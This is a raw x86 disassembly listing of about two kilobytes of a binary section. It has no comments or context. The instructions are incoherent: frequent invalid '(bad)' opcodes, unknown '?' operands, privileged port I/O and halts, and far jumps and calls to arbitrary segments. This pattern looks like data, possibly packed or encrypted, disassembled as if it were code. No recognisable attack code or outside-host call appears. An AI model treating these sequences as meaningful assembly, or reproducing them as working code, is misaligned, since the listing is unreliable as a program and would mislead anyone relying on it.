  42107c:	cmp    BYTE PTR [edi],0x71
  42107f:	psubw  mm1,QWORD PTR [eax+0x7427f521]
  421086:	ja     0x4210e9
  421088:	cmp    eax,0x4b56fe9b
  42108d:	xchg   BYTE PTR [eax+edx*2],ah
  421090:	xchg   edi,eax
  421091:	or     ecx,DWORD PTR ds:0x9a0e3189
  421097:	stc    
  421098:	fistp  DWORD PTR [edx-0x59196138]
  42109e:	lock les esp,FWORD PTR [edx]
  4210a1:	dec    ecx
  4210a2:	jmp    eax
  4210a4:	jmp    0x42105d
  4210a6:	jns    0x4210d5
  4210a8:	jnp    0x421042
  4210aa:	push   esp
  4210ab:	int3   
  4210ac:	repnz sub ebp,DWORD PTR gs:[edx]
  4210b0:	lock stc 
  4210b2:	sub    al,0x95
  4210b4:	lods   eax,DWORD PTR ds:[esi]
  4210b5:	hlt    
  4210b6:	xchg   BYTE PTR [ebp-0x48de4cff],cl
  4210bc:	and    cl,BYTE PTR [eax+0x5fb853a9]
  4210c2:	mov    al,0xb6
  4210c4:	pop    ecx
  4210c5:	gs ret 0x718b
  4210c9:	cmp    al,0xf9
  4210cb:	retf   0x9d97
  4210ce:	xchg   ebx,eax
  4210cf:	xchg   BYTE PTR [esi-0x3a210dce],bl
  4210d5:	push   0x40
  4210d7:	das    
  4210d8:	inc    esp
  4210d9:	sub    al,BYTE PTR [esi-0x2b31d4fb]
  4210df:	icebp  
  4210e0:	aad    0xc7
  4210e2:	fistp  WORD PTR [ebp-0x75]
  4210e5:	cmp    dh,cl
  4210e7:	repnz xor DWORD PTR [eax],edx
  4210ea:	test   DWORD PTR [ebx],esi
  4210ec:	cli    
  4210ed:	jecxz  0x421084
  4210ef:	clc    
  4210f0:	rol    BYTE PTR [eax+0x30caa927],1
  4210f6:	sbb    dl,cl
  4210f8:	mov    edi,0x1de79078
  4210fd:	mov    esi,0xc6e404ac
  421102:	scas   eax,DWORD PTR es:[edi]
  421103:	pop    ebx
  421104:	dec    edx
  421105:	sti    
  421106:	sbb    eax,0x1d274a9d
  42110b:	push   ebx
  42110c:	jbe    0x421171
  42110e:	push   ebp
  42110f:	xchg   ebx,eax
  421110:	mov    eax,0x903bba8e
  421115:	loop   0x4210ad
  421117:	xor    al,0x89
  421119:	push   ds
  42111a:	add    edi,DWORD PTR ds:0x1169c3ee
  421120:	out    0x99,al
  421122:	push   es
  421123:	fst    QWORD PTR [eax+0x7]
  421126:	and    al,0x66
  421128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421129:	stos   DWORD PTR es:[edi],eax
  42112a:	fwait
  42112b:	dec    eax
  42112c:	mov    ds:0x3ebcca14,eax
  421131:	adc    eax,0xdfb50b94
  421136:	and    ebx,DWORD PTR [ebp-0x66baf036]
  42113c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42113d:	push   edx
  42113e:	ds mov edx,0xc7d4896a
  421144:	leave  
  421145:	aaa    
  421146:	add    DWORD PTR [esi+0x16ffc667],eax
  42114c:	add    ah,al
  42114e:	jmp    0x4e85:0x1fff8835
  421155:	les    ebx,FWORD PTR [edi-0x3b05116]
  42115b:	stos   BYTE PTR es:[edi],al
  42115c:	pop    ds
  42115d:	fidivr DWORD PTR [esi+ecx*1]
  421160:	push   ebp
  421161:	xchg   DWORD PTR [ebx-0xa],ebx
  421164:	aas    
  421165:	mov    fs,WORD PTR [ebx+0x1b]
  421168:	push   ds
  421169:	test   DWORD PTR [ebp+0x306c0cf6],esi
  42116f:	pop    eax
  421170:	fldenv [edx-0x7c]
  421173:	and    bh,BYTE PTR [edi]
  421175:	inc    edi
  421176:	pop    ebx
  421177:	arpl   WORD PTR [edx+0x20170867],cx
  42117d:	loopne 0x421167
  42117f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421180:	cmp    DWORD PTR [edx],esi
  421182:	mov    ?,WORD PTR [esi-0x7316c97b]
  421188:	mov    ecx,0x81fd7a99
  42118d:	cdq    
  42118e:	xchg   ebp,eax
  42118f:	fcomp  QWORD PTR [ecx-0x39c55884]
  421195:	or     eax,0xbce288e2
  42119a:	mov    ecx,0x657bfac5
  42119f:	ss cdq 
  4211a1:	xor    DWORD PTR [ecx-0x33c1229],ebp
  4211a7:	fild   DWORD PTR [ebp-0x63340380]
  4211ad:	adc    al,0xb7
  4211af:	pop    ebx
  4211b0:	dec    esp
  4211b1:	mov    dl,ah
  4211b3:	pop    esi
  4211b4:	sub    BYTE PTR [eax+eiz*8+0x2f],ah
  4211b8:	add    BYTE PTR [ecx+0x10faa9eb],al
  4211be:	lock cmp DWORD PTR [ebx+0x7b0fd656],esp
  4211c5:	in     al,dx
  4211c6:	xchg   esp,eax
  4211c7:	xor    al,0x42
  4211c9:	rcl    BYTE PTR [ecx-0x4d],0xb4
  4211cd:	sub    dl,dh
  4211cf:	(bad)  
  4211d0:	call   DWORD PTR [ebx-0x30d4464a]
  4211d6:	mov    dh,0x33
  4211d8:	ret    
  4211d9:	ss mov esi,0xecbc0cbc
  4211df:	out    dx,al
  4211e0:	jbe    0x4211f5
  4211e2:	mov    esi,0xec3f36eb
  4211e7:	call   0x5026dc73
  4211ec:	nop
  4211ed:	mov    esp,0x75978eb9
  4211f2:	bnd ret 
  4211f4:	sbb    al,0xdd
  4211f6:	fild   WORD PTR ds:0x3751be0a
  4211fc:	jo     0x421206
  4211fe:	adc    al,0x3a
  421200:	mov    ch,BYTE PTR [eax+0x14]
  421203:	shl    BYTE PTR [ecx],cl
  421205:	mov    al,0xd7
  421207:	fwait
  421208:	pop    eax
  421209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42120a:	imul   ecx,eax,0xe00bbc91
  421210:	jg     0x4211bd
  421212:	std    
  421213:	test   al,0x36
  421215:	in     al,dx
  421216:	psubb  mm0,QWORD PTR [ebx]
  421219:	or     esi,eax
  42121b:	sbb    ah,BYTE PTR [edi-0x4434751d]
  421221:	popf   
  421222:	in     eax,dx
  421223:	scas   eax,DWORD PTR es:[edi]
  421224:	retf   0xbc7
  421227:	shl    BYTE PTR [esi-0x49],1
  42122a:	fdiv   QWORD PTR [esi+esi*2-0x40]
  42122e:	shl    DWORD PTR [edi+0x4d],0x76
  421232:	mov    al,ds:0xd8148a2d
  421237:	sub    cl,BYTE PTR [edi]
  421239:	inc    edi
  42123a:	data16 test al,0x7c
  42123d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42123e:	addr16 add eax,0xea317408
  421244:	adc    al,0xf5
  421246:	or     BYTE PTR [edx],bh
  421248:	pop    ss
  421249:	jg     0x42124c
  42124b:	adc    eax,DWORD PTR [esp+ecx*1]
  42124e:	aas    
  42124f:	hlt    
  421250:	xlat   BYTE PTR ds:[ebx]
  421251:	push   0xffffff88
  421253:	adc    BYTE PTR [edx+0x619022d],dl
  421259:	js     0x42125a
  42125b:	ror    DWORD PTR [edi],cl
  42125d:	ret    
  42125e:	fnstcw WORD PTR [ebp+0x97621c5]
  421264:	xlat   BYTE PTR ds:[ebx]
  421265:	das    
  421266:	fs (bad) 
  421268:	sti    
  421269:	out    dx,eax
  42126a:	xlat   BYTE PTR ds:[ebx]
  42126b:	stos   BYTE PTR es:[edi],al
  42126c:	xchg   DWORD PTR [eax],edx
  42126e:	js     0x4212a5
  421270:	sbb    DWORD PTR [edi-0xe],edx
  421273:	push   0x41f4a2dd
  421278:	cli    
  421279:	sahf   
  42127a:	jae    0x4212fb
  42127c:	inc    ebp
  42127d:	xchg   esi,eax
  42127e:	mov    cl,0x1a
  421280:	fisttp QWORD PTR [edx+0x1b]
  421283:	neg    dh
  421285:	imul   ecx,DWORD PTR [eax-0x73],0x30116090
  42128c:	imul   BYTE PTR [ebx*4-0x7b774e47]
  421293:	aam    0x7
  421295:	mov    esp,0xbf29c564
  42129a:	inc    esi
  42129b:	dec    esi
  42129c:	mov    al,ds:0xac672a15
  4212a1:	push   esi
  4212a2:	cmp    BYTE PTR [ebx-0x5ba911a7],bl
  4212a8:	push   ss
  4212a9:	shr    BYTE PTR [esi+ebp*1],0xeb
  4212ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212ae:	jmp    0xc92385ea
  4212b3:	enter  0xc66d,0x5d
  4212b7:	enter  0x4d42,0xb1
  4212bb:	mov    dl,0x55
  4212bd:	into   
  4212be:	mov    ?,edi
  4212c0:	das    
  4212c1:	outs   dx,DWORD PTR ds:[esi]
  4212c2:	xor    eax,0x73e445bb
  4212c7:	clc    
  4212c8:	fsubrp st(3),st
  4212ca:	call   0x12ae:0x781d0fb5
  4212d1:	aas    
  4212d2:	inc    ebx
  4212d3:	xor    al,0xfd
  4212d5:	bound  eax,QWORD PTR [edi]
  4212d7:	sbb    BYTE PTR [ecx+0x400d4a85],ch
  4212dd:	cs (bad) 
  4212e0:	dec    ebp
  4212e1:	sbb    bh,BYTE PTR [eax+edx*8]
  4212e4:	xchg   edx,eax
  4212e5:	xor    BYTE PTR [ebx],al
  4212e7:	into   
  4212e8:	xchg   ebp,eax
  4212e9:	sti    
  4212ea:	jnp    0x4212ac
  4212ec:	sub    eax,0x6eae4405
  4212f1:	adc    al,0x5f
  4212f3:	and    ebp,ecx
  4212f5:	inc    eax
  4212f6:	(bad)  
  4212f7:	ins    DWORD PTR es:[edi],dx
  4212f8:	inc    esi
  4212f9:	jnp    0x4212e6
  4212fb:	test   al,0x6e
  4212fd:	sub    BYTE PTR [ebx+0x47],0x67
  421301:	jmp    0x42136f
  421303:	lea    ebp,[ebp+0x5c]
  421306:	shl    BYTE PTR [eax],cl
  421308:	adc    ch,BYTE PTR [ecx-0x79]
  42130b:	loop   0x4212b8
  42130d:	xchg   edi,eax
  42130e:	mov    cl,0x5d
  421310:	xor    dh,ch
  421312:	add    eax,ecx
  421314:	je     0x42133c
  421316:	std    
  421317:	in     eax,dx
  421318:	or     ah,ch
  42131a:	lods   eax,DWORD PTR ds:[esi]
  42131b:	(bad)  
  42131c:	push   esp
  42131d:	cwde   
  42131e:	(bad)  
  42131f:	call   0x75187e88
  421324:	mov    cl,0x3f
  421326:	aad    0xa8
  421328:	shl    DWORD PTR [ebp+0x1f],0x13
  42132c:	fidiv  WORD PTR [ecx]
  42132e:	mov    dl,0x54
  421330:	jl     0x421321
  421332:	sub    cl,BYTE PTR [edi+0x2bceeba6]
  421338:	and    ch,BYTE PTR [ecx-0x17]
  42133b:	add    DWORD PTR [esi+0x6be01302],esi
  421341:	jle    0x42139f
  421343:	add    BYTE PTR [ebp-0x35],0xd1
  421347:	xchg   DWORD PTR [edx],ecx
  421349:	div    BYTE PTR ds:0x8d1330ec
  42134f:	in     eax,0x10
  421351:	test   DWORD PTR [esi+0x25],0x43e456e1
  421358:	or     al,0x30
  42135a:	int    0x2f
  42135c:	test   al,0xbf
  42135e:	mov    dl,0x54
  421360:	lods   al,BYTE PTR ds:[esi]
  421361:	add    al,0xfa
  421363:	int    0x9d
  421365:	sbb    edx,DWORD PTR [esi]
  421367:	and    edi,ecx
  421369:	adc    al,0x4
  42136b:	call   0x6940:0x485b3ab1
  421372:	pusha  
  421373:	inc    esp
  421374:	(bad)  
  421375:	or     DWORD PTR [eax+ecx*4-0xf0187cf],ecx
  42137c:	mov    eax,0xf9143b1b
  421381:	ins    DWORD PTR es:[edi],dx
  421382:	jg     0x42131a
  421384:	adc    bh,BYTE PTR [ebp-0x3a]
  421387:	in     al,dx
  421388:	jne    0x42131b
  42138a:	(bad)  
  42138b:	or     edi,DWORD PTR [edi]
  42138d:	cmc    
  42138e:	cwde   
  42138f:	ror    BYTE PTR [edi+0x23],cl
  421392:	and    al,0x4f
  421394:	and    DWORD PTR [esi],ebp
  421396:	leave  
  421397:	cs push cs
  421399:	push   ebp
  42139a:	into   
  42139b:	fimul  DWORD PTR [ebx+edx*1-0x6148304]
  4213a2:	adc    dh,ch
  4213a4:	add    BYTE PTR [ecx],al
  4213a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a8:	std    
  4213a9:	shr    DWORD PTR [ebx],0x20
  4213ac:	aaa    
  4213ad:	test   eax,0xec2f8077
  4213b2:	stos   BYTE PTR es:[edi],al
  4213b3:	or     ch,bh
  4213b5:	cli    
  4213b6:	xchg   esp,eax
  4213b7:	push   esi
  4213b8:	fist   WORD PTR [ebp+0x23]
  4213bb:	dec    edi
  4213bc:	cdq    
  4213bd:	out    dx,eax
  4213be:	xchg   al,ah
  4213c0:	in     eax,0xf8
  4213c2:	adc    BYTE PTR [esi],dl
  4213c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213c5:	test   DWORD PTR [edx],esp
  4213c7:	sub    DWORD PTR [ebp-0x1d08d7f4],0xffffffd5
  4213ce:	mov    eax,0x31ab25ec
  4213d3:	out    0xac,eax
  4213d5:	pop    ebx
  4213d6:	inc    ecx
  4213d7:	test   DWORD PTR [edx],esi
  4213d9:	test   DWORD PTR [eax],0x5e49e744
  4213df:	ror    DWORD PTR [ecx+0x6912cb6b],cl
  4213e5:	inc    edx
  4213e6:	mov    eax,0x4900ee21
  4213eb:	mov    ah,bl
  4213ed:	and    DWORD PTR [esi-0x54],edx
  4213f0:	xor    BYTE PTR [edx+0x4f],al
  4213f3:	mov    cl,0x67
  4213f5:	pop    edi
  4213f6:	lock (bad) 
  4213f8:	fdiv   st(0),st
  4213fa:	lods   al,BYTE PTR ds:[esi]
  4213fb:	add    DWORD PTR [ebp+ecx*2+0x4f],eax
  4213ff:	push   ecx
  421400:	(bad)  
  421401:	adc    DWORD PTR [esi+0x61ec890d],ebx
  421407:	cmp    DWORD PTR [edi-0x724b6e56],edi
  42140d:	xor    dl,BYTE PTR [edx+0x33915728]
  421413:	push   cs
  421414:	sbb    BYTE PTR [eax],0x11
  421417:	dec    ecx
  421418:	int    0x5c
  42141a:	ficomp WORD PTR [ebx+0x60]
  42141d:	cmp    ch,BYTE PTR [edx]
  42141f:	or     esp,DWORD PTR ds:0x45157c06
  421425:	(bad)  
  421426:	sbb    eax,0x29eccfc2
  42142b:	fwait
  42142c:	enter  0x43eb,0x7c
  421430:	xchg   esp,eax
  421431:	(bad)  
  421432:	(bad)  
  421434:	stc    
  421435:	(bad)  
  421436:	push   eax
  421437:	sti    
  421438:	sti    
  421439:	ds ret 
  42143b:	lahf   
  42143c:	(bad)  [esi]
  42143e:	fdiv   QWORD PTR [eax+0x3f341cc6]
  421444:	cmp    eax,0x210c6bc4
  421449:	pop    esp
  42144a:	rcr    BYTE PTR [edi-0x7ba07e71],1
  421450:	cmp    esp,DWORD PTR [edx-0x1d]
  421453:	cld    
  421454:	push   0xfffffffa
  421456:	sbb    al,0x4d
  421458:	lods   al,BYTE PTR ds:[esi]
  421459:	pushf  
  42145a:	cmp    DWORD PTR [esp+edi*1+0x5177b09c],esi
  421461:	xor    BYTE PTR [ecx-0x7471c736],dl
  421467:	mov    DWORD PTR [edx+0x2c5c41f6],edx
  42146d:	mov    eax,ds:0xe81d2a8d
  421472:	xchg   ebp,eax
  421473:	dec    edi
  421474:	jg     0x421433
  421476:	mov    ah,0xd
  421478:	cmp    ebx,DWORD PTR [ecx-0x70128c1e]
  42147e:	js     0x4214e1
  421480:	cld    
  421481:	(bad)  
  421482:	cmp    eax,0x83ad20cd
  421487:	cld    
  421488:	and    edx,ebp
  42148a:	cmp    DWORD PTR [ecx],eax
  42148c:	dec    esi
  42148d:	jae    0x421454
  42148f:	mov    eax,ds:0x632072af
  421494:	js     0x4214da
  421496:	or     DWORD PTR [eax],eax
	...
  421514:	pushf  
  421515:	sbb    al,bl
  421517:	push   esi
  421518:	(bad)  
  42151a:	sahf   
  42151b:	fidivr DWORD PTR [esi-0x64]
  42151e:	add    al,ah
  421520:	inc    esi
  421521:	pop    eax
  421522:	loope  0x421575
  421524:	lea    ebp,[ecx+eax*1+0x76b00]
  42152b:	add    al,dl
  42152d:	retf   
  42152e:	push   0x67
  421530:	stc    
  421531:	sbb    esp,edx
  421533:	cmp    BYTE PTR [ebp+0x12add304],dl
  421539:	adc    ecx,ecx
  42153b:	add    BYTE PTR [ebx-0x42],0xd6
  42153f:	add    BYTE PTR [esi],al
  421541:	aas    
  421542:	mov    esi,0xb0a429d8
  421547:	in     al,dx
  421548:	adc    DWORD PTR [edx-0x6f],esi
  42154b:	fistp  DWORD PTR [ecx+0x21dc2844]
  421551:	mov    ebp,0x3cf8901f
  421556:	cdq    
  421557:	dec    esp
  421558:	adc    eax,0xdb2139da
  42155d:	dec    edx
  42155e:	push   edx
  42155f:	mov    eax,ds:0x9a4b4a52
  421564:	sub    dh,bl
  421566:	scas   eax,DWORD PTR es:[edi]
  421567:	xor    edx,edi
  421569:	popa   
  42156a:	push   esi
  42156b:	xlat   BYTE PTR ds:[ebx]
  42156c:	cmp    DWORD PTR [eax+0x28],eax
  42156f:	cmp    eax,edx
  421571:	push   edx
  421572:	cld    
  421573:	and    BYTE PTR [ebp-0x3f],al
  421576:	pop    esi
  421577:	ret    0x86f6
  42157a:	adc    al,0xcc
  42157c:	bound  ebp,QWORD PTR [esi+0x11]
  42157f:	scas   eax,DWORD PTR es:[edi]
  421580:	jns    0x4215fb
  421582:	xchg   esp,eax
  421583:	call   0xe88b14a4
  421588:	ficom  WORD PTR [eax]
  42158a:	clc    
  42158b:	or     eax,0x61617032
  421590:	dec    ebx
  421591:	(bad)  
  421592:	mov    esp,0x480c3cc8
  421597:	or     eax,0x5441fdfe
  42159c:	mov    ah,0xe4
  42159e:	push   ecx
  42159f:	xchg   DWORD PTR [edx-0x57],esi
  4215a2:	aas    
  4215a3:	or     DWORD PTR [eax+0x33af21a8],eax
  4215a9:	dec    edx
  4215aa:	push   cs
  4215ab:	dec    ebp
  4215ac:	or     DWORD PTR [eax],edx
  4215ae:	xchg   ebp,eax
  4215af:	fisubr DWORD PTR [eax+0x5c]
  4215b2:	jle    0x4215bb
  4215b4:	jnp    0x421567
  4215b6:	push   ds
  4215b7:	ds in  eax,0x9c
  4215ba:	mov    WORD PTR [ecx+0x6c611985],?
  4215c0:	cmp    al,ah
  4215c2:	xchg   DWORD PTR [eax-0x27a2e565],ebx
  4215c8:	sub    ch,BYTE PTR ds:0x6c362232
  4215ce:	(bad)  
  4215cf:	ja     0x42155a
  4215d1:	mov    dl,cl
  4215d3:	ins    DWORD PTR es:[edi],dx
  4215d4:	jbe    0x421597
  4215d6:	sbb    al,0x0
  4215d8:	sbb    ebp,ecx
  4215da:	inc    ecx
  4215db:	retf   0x69bd
  4215de:	ja     0x4215a4
  4215e0:	das    
  4215e1:	jecxz  0x42156b
  4215e3:	push   esi
  4215e4:	leave  
  4215e5:	dec    si
  4215e7:	mov    ebx,ebx
  4215e9:	bound  ebp,QWORD PTR [edi+0x39fd4b5e]
  4215ef:	mov    al,0x2b
  4215f1:	or     BYTE PTR [edi-0xad0d6f3],ch
  4215f7:	int3   
  4215f8:	(bad)  
  4215f9:	jl     0x42161d
  4215fb:	jae    0x42162c
  4215fd:	out    dx,eax
  4215fe:	add    DWORD PTR [ecx+0x72],0x446c1401
  421605:	push   DWORD PTR [ebx]
  421607:	loope  0x4215c5
  421609:	ret    
  42160a:	or     ebx,DWORD PTR [edi+0x53050ae8]
  421610:	dec    eax
  421611:	repz rcr BYTE PTR [eax-0x1df56d86],0x96
  421619:	sub    eax,0x37cb26a6
  42161e:	aaa    
  42161f:	imul   ecx,DWORD PTR ds:0xbfb82615,0xffffffd4
  421626:	mov    dl,0x98
  421628:	into   
  421629:	js     0x421630
  42162b:	std    
  42162c:	jns    0x4215db
  42162e:	jne    0x4215ed
  421630:	inc    ch
  421632:	xchg   ecx,eax
  421633:	pop    ss
  421634:	mov    dh,0x85
  421636:	stos   DWORD PTR es:[edi],eax
  421637:	xor    bh,BYTE PTR [esi-0xb6fa541]
  42163d:	(bad)
  421640:	add    eax,0x22bdae29
  421645:	fwait
  421646:	pop    esi
  421647:	in     al,0x27
  421649:	sub    DWORD PTR [edi+0x45294fb],esp
  42164f:	mov    ebx,0xd040d318
  421654:	sub    DWORD PTR [esi-0x2f],edi
  421657:	add    DWORD PTR [ebp+0x52a49b28],ecx
  42165d:	xchg   esp,eax
  42165e:	sub    BYTE PTR [eax+0x6599bb2e],dl
  421664:	test   eax,0x6a45fb02
  421669:	addr16 std 
  42166b:	jge    0x42169c
  42166d:	sub    BYTE PTR [ecx-0x7cce58be],0xf3
  421674:	sbb    ebp,DWORD PTR [ebx]
  421676:	stos   BYTE PTR es:[edi],al
  421677:	or     dl,dl
  421679:	push   ebx
  42167a:	fwait
  42167b:	cwde   
  42167c:	lods   eax,DWORD PTR ds:[esi]
  42167d:	je     0x421699
  42167f:	mov    ecx,0x535962d9
  421684:	ja     0x42164c
  421686:	test   eax,0xbde8b752
  42168b:	mov    ah,0x2c
  42168d:	xor    DWORD PTR [ebx],0x4366cfb
  421693:	js     0x421667
  421695:	dec    eax
  421696:	js     0x42170b
  421698:	push   DWORD PTR [edx]
  42169a:	push   0xb75f1d08
  42169f:	jle    0x421665
  4216a1:	into   
  4216a2:	jb     0x4216b6
  4216a4:	lea    esp,[ebp-0x31]
  4216a7:	sbb    al,0x1f
  4216a9:	popf   
  4216aa:	fidiv  WORD PTR [esi+0x5d]
  4216ad:	les    eax,FWORD PTR [esi+0x7b6f6f3b]
  4216b3:	std    
  4216b4:	sub    cl,bh
  4216b6:	xor    al,0x33
  4216b8:	outs   dx,DWORD PTR ds:[esi]
  4216b9:	test   al,0xb1
  4216bb:	fwait
  4216bc:	sbb    eax,0x61688229
  4216c1:	add    DWORD PTR [ecx+ecx*4],ebp
  4216c4:	xchg   BYTE PTR [edx+0x7f4923c4],dh
  4216ca:	imul   esi,DWORD PTR [esi-0x222b1100],0x49
  4216d1:	outs   dx,BYTE PTR ds:[esi]
  4216d2:	jecxz  0x4216cc
  4216d4:	je     0x42170d
  4216d6:	mov    ebp,0x6021aaea
  4216db:	imul   esi,DWORD PTR [edx+edi*4+0x6c34f5b3],0x135ad1bf
  4216e6:	retf   0x23b9
  4216e9:	ss mov cl,0x5b
  4216ec:	mov    eax,0x61329f87
  4216f1:	ja     0x4216d7
  4216f3:	jg     0x421711
  4216f5:	inc    esi
  4216f6:	cmp    BYTE PTR [ebx+0x12f45fa7],0x61
  4216fd:	test   al,0x1b
  4216ff:	adc    esi,0x58
  421702:	xor    al,0x63
  421704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421705:	fwait
  421706:	in     eax,0xdd
  421708:	ja     0x421762
  42170a:	sbb    al,BYTE PTR [esi-0x4a]
  42170d:	sub    BYTE PTR [ebx+eax*8-0x21],ah
  421711:	mov    eax,0x4ea26e2
  421716:	test   al,0xa5
  421718:	push   cs
  421719:	lock je 0x4216dc
  42171c:	jmp    0x4216dc
  42171e:	sbb    ah,BYTE PTR [eax-0x164d4c7d]
  421724:	or     esi,eax
  421726:	adc    BYTE PTR [esi-0x3d8e19d0],bl
  42172c:	fwait
  42172d:	test   al,0x7a
  42172f:	push   ecx
  421730:	mov    eax,ds:0x4b82a836
  421735:	fwait
  421736:	inc    ecx
  421737:	push   ecx
  421738:	lahf   
  421739:	loope  0x4216d2
  42173b:	push   ebp
  42173c:	bound  ebp,QWORD PTR [ecx]
  42173e:	add    BYTE PTR [eax+0x13],al
  421741:	(bad)  
  421742:	xor    eax,DWORD PTR [ecx]
  421744:	adc    ebx,ebx
  421746:	int3   
  421747:	jl     0x421733
  421749:	(bad)  
  42174a:	pop    esi
  42174b:	iret   
  42174c:	daa    
  42174d:	sahf   
  42174e:	sub    BYTE PTR [esp+edi*8],bl
  421751:	lds    esp,FWORD PTR [edi+0x18]
  421754:	lock test eax,0xd6711375
  42175a:	mov    eax,ds:0xa91ea8bb
  42175f:	dec    edx
  421760:	daa    
  421761:	test   al,0xa0
  421763:	sub    ah,BYTE PTR [eax+0x53266a04]
  421769:	fdivrp st(1),st
  42176b:	push   edx
  42176c:	fyl2xp1 
  42176e:	add    eax,0xc31889d
  421773:	mov    ds:0x91fb0f46,al
  421778:	jmp    0x421755
  42177a:	mov    bh,0x5b
  42177c:	dec    ebp
  42177d:	add    ebp,edi
  42177f:	or     al,0xcb
  421781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421782:	fwait
  421783:	xchg   esp,eax
  421784:	jecxz  0x421801
  421786:	xchg   esi,eax
  421787:	sub    ebx,DWORD PTR [esi+0x3b]
  42178a:	cmp    al,BYTE PTR es:[esi-0x8]
  42178e:	sbb    BYTE PTR [esi],cl
  421790:	fcom   DWORD PTR [edx]
  421792:	jge    0x421737
  421794:	mov    edx,0x529fc487
  421799:	daa    
  42179a:	enter  0x895,0xc2
  42179e:	jno    0x421788
  4217a0:	push   0x9af5856a
  4217a5:	sti    
  4217a6:	mov    ds:0x284f83d8,al
  4217ab:	imul   ebp,DWORD PTR [esi-0x8],0xffffff86
  4217af:	sub    al,0xb3
  4217b1:	pushf  
  4217b2:	inc    ebx
  4217b3:	add    bh,BYTE PTR ds:0x45e3c028
  4217b9:	mov    ds:0x8438e805,eax
  4217be:	es sar edx,0xd9
  4217c2:	xor    eax,0xdda74118
  4217c7:	outs   dx,DWORD PTR ds:[esi]
  4217c8:	or     ebx,DWORD PTR [edi+0x50]
  4217cb:	test   BYTE PTR [eax+0x65a7cf16],dl
  4217d1:	jnp    0x42179f
  4217d3:	mov    al,0xde
  4217d5:	mov    edi,0x4d44ea4c
  4217da:	data16 or BYTE PTR [esi],dl
  4217dd:	jns    0x4217bc
  4217df:	ss inc ebx
  4217e1:	mov    ch,0xcc
  4217e3:	outs   dx,BYTE PTR ds:[esi]
  4217e4:	pop    ebp
  4217e5:	mov    edx,0x3c3f7ec3
  4217ea:	mov    WORD PTR [eax-0x33fb0dee],es
  4217f0:	aam    0x8e
  4217f2:	fsub   QWORD PTR [eax]
  4217f4:	jmp    0xacc0:0x6f6027c7
  4217fb:	inc    edi
  4217fc:	aaa    
  4217fd:	inc    esi
  4217fe:	bound  eax,QWORD PTR [ebp-0x6]
  421801:	shr    edi,cl
  421803:	in     eax,0x3c
  421805:	fwait
  421806:	daa    
  421807:	sub    eax,edx
  421809:	mul    BYTE PTR [ebp+eax*4-0x6d04600a]
  421810:	xor    al,0x1f
  421812:	inc    edx
  421813:	push   es
  421814:	mov    ebx,0x66f8ea
  421819:	aas    
  42181a:	jb     0x421869
  42181c:	xchg   edi,eax
  42181d:	mov    ds:0x59dd955f,al
  421822:	inc    esi
  421823:	sbb    al,0xc6
  421825:	cmc    
  421826:	in     eax,dx
  421827:	sub    esi,esi
  421829:	arpl   WORD PTR [esi+edx*8-0x7f],bx
  42182d:	(bad)  
  42182e:	jge    0x4217ef
  421830:	push   ecx
  421831:	outs   dx,DWORD PTR ds:[esi]
  421832:	aad    0xde
  421834:	pop    ds
  421835:	es rcl edx,1
  421838:	cmp    BYTE PTR [esp+edi*2-0x12],bh
  42183c:	popf   
  42183d:	adc    ch,BYTE PTR [ebp+0x12]
  421840:	pop    ebp
  421841:	pop    ds
  421842:	xor    al,0x6b
  421844:	and    dl,ch
  421846:	shl    ah,1
  421848:	push   esp
  421849:	loop   0x4218c7
  42184b:	sub    BYTE PTR [ecx-0x6e],cl
  42184e:	dec    esp
  42184f:	repz in eax,0x1e
  421852:	pop    ds
  421853:	ret    
  421854:	std    
  421855:	mov    edi,0x9cd0355
  42185a:	mov    bh,0x19
  42185c:	(bad)  
  42185d:	pop    esp
  42185e:	inc    esi
  42185f:	mov    al,ds:0x2a7ba05c
  421864:	ret    
  421865:	xchg   DWORD PTR [esi],edx
  421867:	hlt    
  421868:	inc    DWORD PTR [eax]
  42186a:	push   ds
  42186b:	push   eax
  42186c:	mov    ds:0x34a16203,al
  421871:	(bad)  
  421872:	pushf  
  421873:	adc    eax,0xcf5002d7
  421878:	jmp    0x421839
  42187a:	popf   
  42187b:	jno    0x421804
  42187d:	call   0x96f3:0x7a1aa897
  421884:	cmp    ch,BYTE PTR [edi+0x6e]
  421887:	jg     0x421842
  421889:	addr16 dec ecx
  42188b:	repnz sub DWORD PTR [edi+0x31a48e8b],eax
  421892:	xchg   esi,eax
  421893:	imul   esp,DWORD PTR ds:[ebx],0xab2b927a
  42189a:	les    esp,FWORD PTR [ecx]
  42189c:	mov    edx,DWORD PTR [edx]
  42189e:	clc    
  42189f:	push   es
  4218a0:	xchg   edi,eax
  4218a1:	and    edi,DWORD PTR [ebp-0x2]
  4218a4:	xor    ebp,DWORD PTR [edi+0x307a5ecf]
  4218aa:	push   esp
  4218ab:	mov    edx,0x7784d49f
  4218b0:	push   ss
  4218b1:	jno    0x4218ff
  4218b3:	push   esi
  4218b4:	jle    0x4218bb
  4218b6:	stos   BYTE PTR es:[edi],al
  4218b7:	or     ch,0x44
  4218ba:	jle    0x421851
  4218bc:	cmp    eax,0x6b50de7e
  4218c1:	sbb    DWORD PTR [ecx+0x14e04b82],eax
  4218c7:	pop    edx
  4218c8:	je     0x4218b1
  4218ca:	rcl    DWORD PTR ds:0x7daa6269,0xbc
  4218d1:	cs cmc 
  4218d3:	jb     0x4218ae
  4218d5:	(bad)  [eax+0x17567f8d]
  4218db:	add    al,0xd0
  4218dd:	pop    ds
  4218de:	mov    ebx,0xce6bbb0a
  4218e3:	or     eax,0xaf849766
  4218e8:	sbb    al,al
  4218ea:	push   esi
  4218ec:	inc    ebx
  4218ed:	dec    edi
  4218ee:	mov    ebx,0x13733c2e
  4218f3:	inc    edx
  4218f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218f5:	stc    
  4218f6:	test   DWORD PTR [edi+esi*2-0x4b0871c0],ebx
  4218fd:	push   edx
  4218fe:	repz pop ds
